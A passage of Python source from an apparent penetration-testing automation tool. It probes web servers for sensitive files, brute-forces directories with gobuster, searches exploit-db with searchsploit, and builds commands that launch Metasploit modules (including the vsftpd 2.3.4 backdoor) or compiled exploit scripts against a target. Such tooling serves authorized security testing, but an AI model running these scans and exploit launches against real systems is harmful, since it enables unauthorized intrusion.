    def view_web_file_content(self, file_path=None, url=None):
        """
        View the content of a web file
        
        Args:
            file_path (str, optional): Path to a locally downloaded file
            url (str, optional): URL to download and view
            
        Returns:
            str: Content of the file or error message
        """
        content = None
        
        if file_path and os.path.exists(file_path):
            # Read local file
            try:
                with open(file_path, 'r', errors='ignore') as f:
                    content = f.read()
                self.console.print(f"[bold]Content of file [blue]{file_path}[/blue]:[/bold]")
                self.console.print("---" * 20)
                self.console.print(content)
                self.console.print("---" * 20)
                return content
            except Exception as e:
                error_msg = f"Error reading file: {str(e)}"
                self.console.print(f"[red]{error_msg}[/red]")
                return error_msg
        elif url:
            # Download and read the file
            import tempfile
            temp_dir = tempfile.mkdtemp()
            downloaded_file = self.download_file(url, temp_dir)
            
            if downloaded_file:
                try:
                    with open(downloaded_file, 'r', errors='ignore') as f:
                        content = f.read()
                    self.console.print(f"[bold]Content of file [blue]{url}[/blue]:[/bold]")
                    self.console.print("---" * 20)
                    self.console.print(content)
                    self.console.print("---" * 20)
                    return content
                except Exception as e:
                    error_msg = f"Error reading file: {str(e)}"
                    self.console.print(f"[red]{error_msg}[/red]")
                    return error_msg
            else:
                error_msg = "Failed to download file"
                self.console.print(f"[red]{error_msg}[/red]")
                return error_msg
        else:
            error_msg = "No file path or URL provided"
            self.console.print(f"[red]{error_msg}[/red]")
            return error_msg 

    def _check_server_connectivity(self, host, port, protocol="http", timeout=3):
        """
        Check if a server is accessible before attempting downloads
        
        Args:
            host (str): Host to check
            port (int or str): Port number
            protocol (str): Protocol (http or https)
            timeout (int): Connection timeout in seconds
            
        Returns:
            bool: True if server is accessible, False otherwise
        """
        import socket
        import requests
        from requests.packages.urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        
        self.logger.info(f"Checking connectivity to {host}:{port} using {protocol}...")
        
        # First try a simple socket connection to check if the port is open
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, int(port)))
            sock.close()
            
            if result != 0:
                self.logger.warning(f"Port {port} appears to be closed on {host}")
                self.console.print(f"[yellow]Warning: Port {port} appears to be closed on {host}[/yellow]")
                self.console.print("[yellow]Network connection might be unavailable or port is not open[/yellow]")
                return False
        except Exception as e:
            self.logger.warning(f"Socket connection error to {host}:{port}: {str(e)}")
            self.console.print(f"[yellow]Warning: Cannot connect to {host}:{port}: {str(e)}[/yellow]")
            return False
        
        # If socket connection succeeded, try HTTP(S) request
        try:
            url = f"{protocol}://{host}:{port}/"
            response = requests.head(url, timeout=timeout, verify=False)
            self.logger.info(f"HTTP connection to {url} succeeded with status code: {response.status_code}")
            return True
        except requests.RequestException as e:
            self.logger.warning(f"HTTP connection error to {url}: {str(e)}")
            self.console.print(f"[yellow]Warning: HTTP connection to {url} failed: {str(e)}[/yellow]")
            # If socket connected but HTTP failed, the port might be used by a different service
            self.console.print("[yellow]Port is open but might not be running an HTTP server[/yellow]")
            return False

    def interactive_download_files(self, target=None, port=80, protocol="http"):
        """
        Interactive file download - allows user to select which discovered files to download
        
        Args:
            target (str, optional): Target host (if different from current target)
            port (int or str): Port of the web service
            protocol (str): Protocol (http or https)
            
        Returns:
            list: List of downloaded file paths
        """
        if target is None:
            target = self.target

        port_str = str(port)
        downloaded_files = []
        
        # Initialize downloader first, outside the core logic, to handle dependencies
        try:
            if not hasattr(self, 'downloader'):
                from redflow.utils.downloader import FileDownloader
                self.downloader = FileDownloader(self.config.output_dir, self.logger, self.console)
        except ImportError as e:
            # Handle the case where dependencies are missing
            missing_package = str(e).split("'")[-2] if "'" in str(e) else str(e)
            self.console.print(f"[bold red]Missing dependency: {missing_package}[/bold red]")
            self.console.print(f"[yellow]Please install it with: pip install {missing_package}[/yellow]")
            return downloaded_files
        
        # First check if the server is accessible
        if not self._check_server_connectivity(target, port_str, protocol):
            self.console.print(f"[bold red]Cannot connect to {protocol}://{target}:{port_str}[/bold red]")
            
            # Ask user if they want to continue anyway or change target
            self.console.print("\n[yellow]Options:[/yellow]")
            self.console.print("1. Continue anyway (files might fail to download)")
            self.console.print("2. Change target IP/hostname")
            self.console.print("3. Abort download operation")
            
            choice = input("Enter your choice (1-3): ").strip()
            
            if choice == "2":
                new_target = input("Enter new target IP/hostname: ").strip()
                if new_target:
                    # Retry with new target
                    self.console.print(f"[green]Retrying with new target: {new_target}[/green]")
                    return self.interactive_download_files(new_target, port_str, protocol)
            elif choice == "3":
                self.console.print("[yellow]Download operation aborted[/yellow]")
                return downloaded_files
            # For choice 1 or invalid choice, continue anyway
            self.console.print("[yellow]Continuing with download attempts...[/yellow]")
        
        # Get the web service results for the specified port
        web_files = []
        web_dirs = []
        
        if isinstance(self.results["web"], list):
            for web_service in self.results["web"]:
                if str(web_service.get("port", "")) == port_str and web_service.get("protocol", "") == protocol:
                    web_files = web_service.get("files", [])
                    web_dirs = web_service.get("directories", [])
                    break
        
        # Check if we found any files in previous full scan
        discovered_files_path = os.path.join(self.config.output_dir, "results.json")
        if (not web_files and not web_dirs) and os.path.exists(discovered_files_path):
            # Using a single try-except block for the entire operations
            try:
                self.console.print("[yellow]Looking for discovered files in previous scan results...[/yellow]")
                with open(discovered_files_path, 'r') as f:
                    scan_results = json.load(f)
                    
                # Look for web enumeration results
                if "enumeration" in scan_results and "web" in scan_results["enumeration"]:
                    web_results = scan_results["enumeration"]["web"]
                    
                    # Look for the matching port and protocol
                    if isinstance(web_results, list):
                        for web_result in web_results:
                            if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                web_files = web_result.get("files", [])
                                web_dirs = web_result.get("directories", [])
                                
                                # Update current results
                                if web_files or web_dirs:
                                    self.console.print(f"[green]Found {len(web_files)} files and {len(web_dirs)} directories in previous scan results![/green]")
                                    
                                    # Update our current results
                                    web_info = {
                                        "port": port_str,
                                        "protocol": protocol,
                                        "directories": web_dirs,
                                        "files": web_files,
                                        "tech": web_result.get("tech", []),
                                        "vhosts": web_result.get("vhosts", []),
                                        "downloaded_files": web_result.get("downloaded_files", [])
                                    }
                                    
                                    # Store in our current results
                                    if not isinstance(self.results["web"], list):
                                        self.results["web"] = []
                                    
                                    found = False
                                    for i, service in enumerate(self.results["web"]):
                                        if str(service.get("port", "")) == port_str and service.get("protocol", "") == protocol:
                                            self.results["web"][i] = web_info
                                            found = True
                                            break
                                    
                                    if not found:
                                        self.results["web"].append(web_info)
                                    break
            except Exception as e:
                self.logger.error(f"Error loading discovered files from scan results: {str(e)}")
        
        # If no files or directories were found, perform a quick enumeration to discover files
        if not web_files and not web_dirs:
            self.console.print("[yellow]No files or directories discovered yet. Performing quick enumeration to find files...[/yellow]")
            
            # Create a web_info dictionary to store results
            web_info = {
                "port": port_str,
                "protocol": protocol,
                "directories": [],
                "files": [],
                "tech": [],
                "vhosts": [],
                "downloaded_files": []
            }
            
            # Create target URL
            target_url = f"{protocol}://{target}:{port_str}/"
            
            # Try to check for common files
            common_files = [
                "robots.txt", "sitemap.xml", ".htaccess", "crossdomain.xml", 
                "index.html", "index.php", "default.aspx", "favicon.ico",
                ".git/HEAD", "README.md", "CHANGELOG.md", "login.php",
                "admin.php", "wp-login.php", "config.php", "phpinfo.php"
            ]
            
            self.console.print(f"[cyan]Checking for common files on {target_url}...[/cyan]")
            
            for file in common_files:
                file_url = f"{target_url}{file}"
                try:
                    import requests
                    from requests.packages.urllib3.exceptions import InsecureRequestWarning
                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                    
                    resp = requests.get(file_url, verify=False, timeout=5)
                    if resp.status_code == 200:
                        file_path = f"/{file}"
                        if file_path not in web_info["files"]:
                            self.logger.info(f"Found common file: {file_path}")
                            self.console.print(f"[green]Found: {file_path}[/green]")
                            web_info["files"].append(file_path)
                except Exception as e:
                    self.logger.debug(f"Error checking {file_url}: {str(e)}")
            
            # Check for interesting paths in root directory
            interesting_paths = [
                "/backup", "/admin", "/login", "/config", "/dashboard", 
                "/wp-admin", "/wp-login.php", "/wp-config.php", "/config.php",
                "/administrator", "/phpmyadmin", "/secret", "/private", "/uploads",
                "/images", "/img", "/css", "/js", "/scripts", "/assets"
            ]
            
            self.console.print(f"[cyan]Checking for common directories on {target_url}...[/cyan]")
            
            for path in interesting_paths:
                path_url = f"{target_url.rstrip('/')}{path}"
                try:
                    resp = requests.head(path_url, verify=False, timeout=5)
                    if resp.status_code != 404:
                        if path.endswith("/") or "." not in path:
                            if path not in web_info["directories"]:
                                self.logger.info(f"Found interesting directory: {path}")
                                self.console.print(f"[green]Found directory: {path}[/green]")
                                web_info["directories"].append(path)
                        else:
                            if path not in web_info["files"]:
                                self.logger.info(f"Found interesting file: {path}")
                                self.console.print(f"[green]Found file: {path}[/green]")
                                web_info["files"].append(path)
                except Exception as e:
                    self.logger.debug(f"Error checking {path_url}: {str(e)}")
            
            # Update web_files and web_dirs with newly discovered items
            web_files = web_info["files"]
            web_dirs = web_info["directories"]
            
            # Store the results for future use
            # Make sure we have a list structure for web results
            if not isinstance(self.results["web"], list):
                self.results["web"] = []
            
            # Check if we have an entry for this port/protocol
            found = False
            for i, web_service in enumerate(self.results["web"]):
                if str(web_service.get("port", "")) == port_str and web_service.get("protocol", "") == protocol:
                    self.results["web"][i] = web_info
                    found = True
                    break
            
            if not found:
                self.results["web"].append(web_info)
        
        # If we still have no files or directories, inform the user
        if not web_files and not web_dirs:
            self.console.print("[yellow]No files or directories discovered on this port even after enumeration.[/yellow]")
            self.console.print(f"[yellow]You may need to run a full scan first with: python redflow.py --target {target} --mode full[/yellow]")
            return downloaded_files
        
        # Display discovered files and directories for selection
        self.console.print(f"\n[bold cyan]Files discovered on {protocol}://{target}:{port_str}[/bold cyan]")
        
        all_paths = []
        
        if web_files:
            self.console.print(f"\n[bold green]Files ({len(web_files)}):[/bold green]")
            for i, file in enumerate(web_files, 1):
                self.console.print(f"  {i}. {file}")
                all_paths.append({"type": "file", "path": file})
        
        if web_dirs:
            self.console.print(f"\n[bold green]Directories ({len(web_dirs)}):[/bold green]")
            for i, directory in enumerate(web_dirs, len(web_files) + 1):
                self.console.print(f"  {i}. {directory}")
                all_paths.append({"type": "directory", "path": directory})
        
        # Display all paths with indices
        self.console.print("\n[bold green]Available Files and Directories:[/bold green]")
        for i, path in enumerate(all_paths, 1):
            path_type = path["type"]
            path_url = path["path"]
            if path_type == "directory":
                self.console.print(f"[cyan]{i}.[/cyan] [bold blue][DIR][/bold blue] {path_url}")
            else:
                self.console.print(f"[cyan]{i}.[/cyan] [FILE] {path_url}")
        
        self.console.print("\n[bold]Enter numbers separated by commas, 'all' for all files, 'none' to skip, or 'scan X' to deep scan directory number X[/bold]")
        
        # Interactive mode requires input from user
        try:
            selection = input("> ").strip().lower()
            
            if selection == "all":
                indices = list(range(1, len(all_paths) + 1))
            elif selection == "none" or not selection:
                self.console.print("[yellow]No files selected for download[/yellow]")
                return downloaded_files
            elif selection.startswith("scan "):
                # Parse directory to scan
                try:
                    dir_idx = int(selection.split("scan ")[1].strip())
                    if 1 <= dir_idx <= len(all_paths) and all_paths[dir_idx-1]["type"] == "directory":
                        dir_path = all_paths[dir_idx-1]["path"]
                        
                        # Perform recursive scan on this directory
                        self.console.print(f"[bold cyan]Performing deep scan of directory: {dir_path}[/bold cyan]")
                        scan_results = self.scan_directory_recursively(target, port_str, protocol, dir_path)
                        
                        # Display results and update our data
                        new_files = [f for f in scan_results["files"] if f not in web_files]
                        new_dirs = [d for d in scan_results["directories"] if d not in web_dirs]
                        
                        if new_files or new_dirs:
                            # Update the web_info and results
                            web_files.extend(new_files)
                            web_dirs.extend(new_dirs)
                            
                            # Update in our results structure
                            for web_result in self.results["web"]:
                                if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                    web_result["files"].extend(new_files)
                                    web_result["directories"].extend(new_dirs)
                                    break
                            
                            # Call this function again to display the updated list
                            self.console.print(f"[green]Found {len(new_files)} new files and {len(new_dirs)} new directories![/green]")
                            self.console.print("[yellow]Displaying updated list of files and directories...[/yellow]")
                            return self.interactive_download_files(target, port_str, protocol)
                        else:
                            self.console.print("[yellow]No additional files or directories found[/yellow]")
                            # Continue with the current list
                            return self.interactive_download_files(target, port_str, protocol)
                    else:
                        self.console.print("[red]Invalid directory number. Please choose a directory from the list.[/red]")
                        return self.interactive_download_files(target, port_str, protocol)
                except ValueError:
                    self.console.print("[red]Invalid format. Use 'scan X' where X is the directory number.[/red]")
                    return self.interactive_download_files(target, port_str, protocol)
            else:
                # Parse user selection
                try:
                    indices = [int(idx.strip()) for idx in selection.split(",") if idx.strip()]
                except ValueError:
                    self.console.print("[red]Invalid input. Please enter numbers separated by commas.[/red]")
                    return downloaded_files
            
            # Download selected files
            base_url = f"{protocol}://{target}:{port_str}"
            target_dir = os.path.join(self.config.output_dir, "downloads", f"{protocol}_{port_str}")
            os.makedirs(target_dir, exist_ok=True)
            
            self.console.print(f"[cyan]Files will be downloaded to: {target_dir}[/cyan]")
            
            total_success = 0
            total_failed = 0
            max_retry_count = 2  # Maximum number of retries for failures
            
            for idx in indices:
                if 1 <= idx <= len(all_paths):
                    item = all_paths[idx - 1]
                    path = item["path"]
                    item_type = item["type"]
                    
                    # Create the full URL
                    url = f"{base_url}{path}"
                    
                    # For retrying with modified parameters
                    retry_count = 0
                    
                    while retry_count <= max_retry_count:
                        if item_type == "file":
                            self.console.print(f"[bold]Downloading file: [blue]{path}[/blue]...[/bold]")
                            
                            try:
                                # Directly use requests for download to handle dependency issues
                                local_filename = os.path.join(target_dir, os.path.basename(path))
                                
                                # Ensure we have a filename
                                if not os.path.basename(path):
                                    local_filename = os.path.join(target_dir, "index.html")
                                
                                # Download the file with timeout
                                import requests
                                response = requests.get(url, verify=False, timeout=10, allow_redirects=True)
                                
                                if response.status_code == 200:
                                    with open(local_filename, 'wb') as f:
                                        f.write(response.content)
                                    
                                    downloaded_files.append(local_filename)
                                    self.console.print(f"[green]Downloaded to:[/green] {local_filename}")
                                    total_success += 1
                                    
                                    # Store in results
                                    for web_result in self.results["web"]:
                                        if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                            if "downloaded_files" not in web_result:
                                                web_result["downloaded_files"] = []
                                            
                                            web_result["downloaded_files"].append({
                                                "url": url,
                                                "local_path": local_filename
                                            })
                                            break
                                    
                                    # Success, break retry loop
                                    break
                                else:
                                    self.console.print(f"[yellow]Server returned status code {response.status_code} for {path}[/yellow]")
                                    retry_count += 1
                                    
                                    if retry_count <= max_retry_count:
                                        self.console.print(f"[yellow]Retrying... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                    else:
                                        self.console.print(f"[red]Failed to download {path} after {max_retry_count} attempts[/red]")
                                        total_failed += 1
                            except Exception as e:
                                self.console.print(f"[red]Failed to download {path}: {str(e)}[/red]")
                                retry_count += 1
                                
                                if retry_count <= max_retry_count:
                                    self.console.print(f"[yellow]Retrying... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                else:
                                    total_failed += 1
                        else:  # directory
                            self.console.print(f"[bold]Checking directory: [blue]{path}[/blue]...[/bold]")
                            
                            try:
                                # Try to download index files from directory
                                index_files = ["index.html", "index.php", "default.asp", "index.jsp", "default.html"]
                                dir_success = False
                                
                                for index in index_files:
                                    index_url = f"{base_url}{path}/{index}"
                                    self.console.print(f"[cyan]Trying: {index_url}[/cyan]")
                                    
                                    # Check if file exists with longer timeout
                                    response = requests.head(index_url, verify=False, timeout=10)
                                    if response.status_code == 200:
                                        # Download the file
                                        dir_path = os.path.join(target_dir, os.path.basename(path.rstrip('/')))
                                        os.makedirs(dir_path, exist_ok=True)
                                        
                                        local_filename = os.path.join(dir_path, index)
                                        response = requests.get(index_url, verify=False, timeout=10)
                                        
                                        with open(local_filename, 'wb') as f:
                                            f.write(response.content)
                                        
                                        downloaded_files.append(local_filename)
                                        self.console.print(f"[green]Downloaded directory index to:[/green] {local_filename}")
                                        dir_success = True
                                        total_success += 1
                                        
                                        # Store in results
                                        for web_result in self.results["web"]:
                                            if str(web_result.get("port", "")) == port_str and web_result.get("protocol", "") == protocol:
                                                if "downloaded_files" not in web_result:
                                                    web_result["downloaded_files"] = []
                                                
                                                web_result["downloaded_files"].append({
                                                    "url": index_url,
                                                    "local_path": local_filename
                                                })
                                                break
                                        
                                        # Found and downloaded one index, break loop
                                        break
                                
                                if dir_success:
                                    # Successfully downloaded directory index, break retry loop
                                    break
                                else:
                                    self.console.print("[yellow]No index files found in directory. Try manually browsing to the directory.[/yellow]")
                                    retry_count += 1
                                    
                                    if retry_count <= max_retry_count:
                                        self.console.print(f"[yellow]Retrying with different approach... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                        # On retry, try to download directory listing directly
                                        if retry_count == max_retry_count:
                                            dir_url = f"{base_url}{path}"
                                            try:
                                                dir_path = os.path.join(target_dir, os.path.basename(path.rstrip('/')))
                                                os.makedirs(dir_path, exist_ok=True)
                                                
                                                local_filename = os.path.join(dir_path, "directory.html")
                                                response = requests.get(dir_url, verify=False, timeout=10)
                                                
                                                if response.status_code == 200:
                                                    with open(local_filename, 'wb') as f:
                                                        f.write(response.content)
                                                    
                                                    downloaded_files.append(local_filename)
                                                    self.console.print(f"[green]Downloaded directory listing to:[/green] {local_filename}")
                                                    dir_success = True
                                                    total_success += 1
                                            except Exception as e:
                                                self.console.print(f"[red]Failed to download directory listing: {str(e)}[/red]")
                                    else:
                                        total_failed += 1
                            except Exception as e:
                                self.console.print(f"[red]Failed to check directory {path}: {str(e)}[/red]")
                                retry_count += 1
                                
                                if retry_count <= max_retry_count:
                                    self.console.print(f"[yellow]Retrying... (Attempt {retry_count}/{max_retry_count})[/yellow]")
                                else:
                                    total_failed += 1
                else:
                    self.console.print(f"[red]Invalid selection: {idx}[/red]")
            
            # Save results
            try:
                results_file = os.path.join(self.config.output_dir, "results.json")
                if os.path.exists(results_file):
                    with open(results_file, 'r') as f:
                        all_results = json.load(f)
                    
                    # Update the web results
                    if "enumeration" in all_results:
                        all_results["enumeration"]["web"] = self.results["web"]
                    
                    with open(results_file, 'w') as f:
                        json.dump(all_results, f, indent=4)
            except Exception as e:
                self.logger.error(f"Error saving download results: {str(e)}")
            
            # Display summary
            if downloaded_files:
                self.console.print(f"\n[green]Successfully downloaded {total_success} files[/green]")
                self.console.print(f"[cyan]Files saved in: {target_dir}[/cyan]")
                
                # Show command to view files
                self.console.print("\n[yellow]To view or manage downloaded files:[/yellow]")
                self.console.print(f"[cyan]cd {target_dir}[/cyan]")
                self.console.print("[cyan]ls -la[/cyan]")
            else:
                self.console.print("[yellow]No files were successfully downloaded[/yellow]")
            
            if total_failed > 0:
                self.console.print(f"[yellow]Failed to download {total_failed} item(s)[/yellow]")
                
                # Suggest alternatives
                self.console.print("\n[bold cyan]Troubleshooting:[/bold cyan]")
                self.console.print("1. Check if the target is accessible and the service is running")
                self.console.print("2. Try accessing the files directly in a browser")
                self.console.print("3. Verify you have the correct IP address and port")
                self.console.print("4. If you're targeting localhost, make sure the web server is running")
                self.console.print(f"5. Try running: curl -v {protocol}://{target}:{port_str} to test connectivity")
            
            return downloaded_files
        except KeyboardInterrupt:
            self.console.print("\n[yellow]Download operation cancelled by user[/yellow]")
            return downloaded_files

    def scan_directory_recursively(self, target, port, protocol, directory_path):
        """
        Perform recursive directory scan on a web server
        
        Args:
            target (str): Target host
            port (int or str): Web service port
            protocol (str): Protocol (http or https)
            directory_path (str): Directory path to scan
            
        Returns:
            dict: Dictionary with discovered files and directories
        """
        result = {
            "directories": [],
            "files": []
        }
        
        self.console.print(f"[bold cyan]Performing deep scan of directory: {directory_path}[/bold cyan]")
        
        # Create target URL
        base_url = f"{protocol}://{target}:{port}"
        target_url = f"{base_url}{directory_path}"
        if not target_url.endswith('/'):
            target_url += '/'
        
        # Try to run a quick gobuster scan on the directory
        try:
            # Display available wordlists and let user choose
            wordlists = {
                "common": "/usr/share/wordlists/dirb/common.txt",
                "small": "/usr/share/wordlists/dirb/small.txt",
                "medium": "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt",
                "big": "/usr/share/dirbuster/wordlists/directory-list-2.3-big.txt",
                "raft-small": "/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt",
                "raft-medium": "/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
            }
            
            self.console.print("\n[bold cyan]Available wordlists for scanning:[/bold cyan]")
            for i, (name, path) in enumerate(wordlists.items(), 1):
                # Check if wordlist exists
                if os.path.exists(path):
                    self.console.print(f"[green]{i}.[/green] {name} - {path}")
                else:
                    self.console.print(f"[red]{i}.[/red] {name} - {path} [red](not found)[/red]")
            
            self.console.print(f"[cyan]Select a wordlist (1-{len(wordlists)}) or press Enter for default:[/cyan]")
            choice = input("> ").strip()
            
            # Default to common wordlist
            if not choice or not choice.isdigit() or int(choice) < 1 or int(choice) > len(wordlists):
                wordlist = list(wordlists.values())[0]
                wordlist_name = list(wordlists.keys())[0]
            else:
                wordlist = list(wordlists.values())[int(choice) - 1]
                wordlist_name = list(wordlists.keys())[int(choice) - 1]
                
            # Allow custom wordlist path input if selected wordlist doesn't exist
            if not os.path.exists(wordlist):
                self.console.print("[yellow]Selected wordlist not found. Enter a custom wordlist path:[/yellow]")
                custom_path = input("> ").strip()
                if custom_path and os.path.exists(custom_path):
                    wordlist = custom_path
                    wordlist_name = os.path.basename(custom_path)
                else:
                    self.console.print("[yellow]No suitable wordlist found for directory scanning[/yellow]")
                    
                    # Try the default from the config
                    wordlist = self.config.wordlist_paths.get("dirb_common")
                    if not os.path.exists(wordlist):
                        # If wordlist not found, try to find another one
                        for key, wl_path in self.config.wordlist_paths.items():
                            if os.path.exists(wl_path) and "dir" in key:
                                wordlist = wl_path
                                break
            
            if not wordlist or not os.path.exists(wordlist):
                self.console.print("[red]No suitable wordlist found for directory scanning[/red]")
                return result
            
            self.console.print(f"[cyan]Running gobuster scan on directory {target_url} with {os.path.basename(wordlist)}...[/cyan]")
            
            # Ask for extensions to scan
            self.console.print("[cyan]Enter file extensions to look for (comma separated, e.g., php,txt,html) or press Enter for none:[/cyan]")
            extensions = input("> ").strip()
            
            # Create temporary output file
            output_file = os.path.join(self.config.output_dir, f"gobuster_recursive_{port}_{directory_path.replace('/', '_')}.txt")
            
            # Build gobuster command
            cmd = [
                "gobuster", "dir",
                "-u", target_url,
                "-w", wordlist,
                "-o", output_file,
                "-t", str(self.config.tool_settings["gobuster"]["threads"])
            ]
            
            # Add extensions if specified
            if extensions:
                cmd.extend(["-x", extensions])
            
            # Add HTTPS parameter if needed
            if protocol == "https":
                cmd.extend(["-k"])
            
            # Run gobuster
            import subprocess
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True
            )
            
            self.console.print("[cyan]Scanning in progress, please wait...[/cyan]")
            stdout, stderr = process.communicate(timeout=180)  # Limit to 3 minutes
            
            # Parse results
            if os.path.exists(output_file):
                with open(output_file, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                    
                    for line in lines:
                        if line.startswith("/") or "(Status:" in line:
                            parts = line.split("(Status:")
                            if len(parts) > 1:
                                path = parts[0].strip()
                                status = parts[1].split(")")[0].strip()
                                
                                # Add only items with status codes 2xx or 3xx
                                if status.startswith("2") or status.startswith("3"):
                                    full_path = directory_path
                                    if not full_path.endswith('/'):
                                        full_path += '/'
                                    if path.startswith('/'):
                                        path = path[1:]
                                    full_path += path
                                    
                                    if path.endswith("/"):
                                        result["directories"].append(full_path)
                                    else:
                                        result["files"].append(full_path)
                
                self.console.print(f"[green]Found {len(result['directories'])} directories and {len(result['files'])} files in directory {directory_path}[/green]")
        except Exception as e:
            self.console.print(f"[red]Error scanning directory {directory_path}: {str(e)}[/red]")
        
        return result

    def find_vulnerabilities_with_searchsploit(self, service_name, version=None):
        """
        Search for vulnerabilities using searchsploit
        
        Args:
            service_name: Service name to search for
            version: Optional version number
            
        Returns:
            List of vulnerabilities found
        """
        self.logger.info(f"Searching for vulnerabilities for {service_name} {version if version else ''}")
        
        # Special case for vsftpd 2.3.4 which has a known backdoor
        if service_name.lower() == "vsftpd" and version == "2.3.4":
            self.logger.info("Known backdoor detected in vsftpd 2.3.4!")
            return [{
                "title": "vsftpd 2.3.4 - Backdoor Command Execution",
                "path": "unix/remote/49757.py",
                "type": "remote",
                "platform": "unix"
            }]
        
        # Construct search query
        search_query = service_name
        if version:
            search_query = f"{service_name} {version}"
        
        # Run searchsploit
        try:
            cmd = ["searchsploit", search_query]
            result = subprocess.run(cmd, capture_output=True, text=True)
            output = result.stdout
            
            # Save raw output to file with timestamp
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_file = f"searchsploit_{service_name.replace(' ', '_')}_{timestamp}.txt"
            
            try:
                with open(output_file, 'w') as f:
                    f.write(output)
            except Exception as e:
                self.logger.warning(f"Could not save searchsploit output: {str(e)}")
            
            # Parse the output
            vulnerabilities = []
            lines = output.split('\n')
            
            for line in lines:
                if line and not line.startswith('Exploits:') and not line.startswith('Shellcodes:') and not line.startswith('Papers:'):
                    # Extract exploit details
                    parts = line.strip().split('  ')
                    parts = [p for p in parts if p.strip()]
                    
                    if len(parts) >= 2:
                        title = parts[0].strip()
                        path = parts[-1].strip()
                        
                        if title and path:
                            vulnerabilities.append({
                                "title": title,
                                "path": path,
                                "type": "unknown",
                                "platform": "unknown"
                            })
            
            if vulnerabilities:
                return vulnerabilities
                
            # If no results found, try alternative search
            if not vulnerabilities and version:
                self.logger.info(f"No results found, trying broader search for {service_name}")
                return self.find_vulnerabilities_with_searchsploit(service_name)
                
            return vulnerabilities
        
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Error running searchsploit: {str(e)}")
            return []
        except Exception as e:
            self.logger.error(f"Unexpected error in vulnerability search: {str(e)}")
            return []

    def prepare_exploit(self, exploit_path, target):
        """
        Prepare an exploit for use
        
        Args:
            exploit_path: Path of the exploit in the searchsploit database
            target: Target IP or hostname
            
        Returns:
            Dictionary with exploit information or None if failed
        """
        self.logger.info(f"Preparing exploit: {exploit_path} for target: {target}")
        
        if not exploit_path:
            self.logger.error("No exploit path provided")
            return None
            
        # Create basename from exploit path
        exploit_basename = os.path.basename(exploit_path)
        exploit_name, exploit_ext = os.path.splitext(exploit_basename)
        
        # Determine exploit type based on extension
        exploit_info = {
            "path": exploit_path,
            "local_path": "",
            "name": exploit_name,
            "type": "unknown"
        }
        
        # Clean target string and ensure it's not empty
        if not target or target == "localhost" or target == "127.0.0.1":
            # Try to get target from config
            if hasattr(self.config, 'target') and self.config.target:
                target = self.config.target
                
        # Add target to exploit info
        exploit_info["target"] = target
        
        # Check if exploit path contains metasploit information
        if "metasploit" in exploit_path.lower() or "/msf/" in exploit_path.lower() or exploit_ext.lower() == ".rb":
            exploit_info["type"] = "metasploit"
            
            # Try to extract the Metasploit module path from the exploit path
            msf_path = self._extract_metasploit_path(exploit_path)
            
            if msf_path:
                exploit_info["msf_module"] = msf_path
                exploit_info["command"] = f"msfconsole -q -x 'use exploit/{msf_path}; set RHOSTS {target}; run'"
                return exploit_info
                
        # Check if it's a special case for vsftpd 2.3.4 backdoor
        if "vsftpd" in exploit_path.lower() and "2.3.4" in exploit_path:
            if "17491" in exploit_path:
                # Metasploit version
                exploit_info["type"] = "metasploit"
                exploit_info["msf_module"] = "unix/ftp/vsftpd_234_backdoor"
                exploit_info["command"] = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; run'"
                return exploit_info
            elif "49757" in exploit_path or exploit_ext.lower() == ".py":
                # Python version
                exploit_info["type"] = "python"
                # We'll try to copy it later, but set a fallback command
                exploit_info["command"] = f"python {exploit_name}{exploit_ext} {target} 21"
                return exploit_info
        
        # Try to find the exploit in the searchsploit directory
        exploit_dir = "/usr/share/exploitdb"
        if not os.path.exists(exploit_dir):
            # Try alternative paths
            alt_paths = [
                "/opt/exploitdb",
                "/usr/local/share/exploitdb",
                "/usr/share/exploitdb-git"
            ]
            
            for path in alt_paths:
                if os.path.exists(path):
                    exploit_dir = path
                    break
        
        # Check if exploit_dir exists now
        if not os.path.exists(exploit_dir):
            self.logger.warning(f"Exploit path does not exist: {exploit_path}")
            
            # Try to use searchsploit -m to copy the exploit
            try:
                # Extract ID from the path (e.g., 12345 from /path/to/12345.py)
                exploit_id = os.path.splitext(os.path.basename(exploit_path))[0]
                if exploit_id.isdigit():
                    self.logger.info(f"Attempting to copy exploit using searchsploit -m {exploit_id}")
                    
                    # Use searchsploit to copy the exploit
                    command = ["searchsploit", "-m", exploit_id]
                    result = run_tool(command, timeout=10)
                    
                    if result["returncode"] == 0:
                        # Find the copied file in the current directory
                        current_dir = os.getcwd()
                        for file in os.listdir(current_dir):
                            if file.startswith(exploit_id) or file.endswith(exploit_id + exploit_ext):
                                local_path = os.path.join(current_dir, file)
                                
                                self.logger.info(f"Exploit copied to: {local_path}")
                                
                                # Update exploit info
                                exploit_info["local_path"] = local_path
                                
                                # Determine command based on file extension
                                if exploit_ext.lower() == ".py":
                                    exploit_info["type"] = "python"
                                    exploit_info["command"] = f"python {local_path} {target}"
                                elif exploit_ext.lower() == ".sh":
                                    exploit_info["type"] = "bash"
                                    exploit_info["command"] = f"bash {local_path} {target}"
                                elif exploit_ext.lower() == ".rb" and "metasploit" not in exploit_info["type"]:
                                    exploit_info["type"] = "ruby"
                                    exploit_info["command"] = f"ruby {local_path} {target}"
                                elif exploit_ext.lower() == ".c":
                                    exploit_info["type"] = "c"
                                    exploit_info["command"] = f"gcc {local_path} -o {exploit_name} && ./{exploit_name} {target}"
                                elif exploit_ext.lower() == ".php":
                                    exploit_info["type"] = "php"
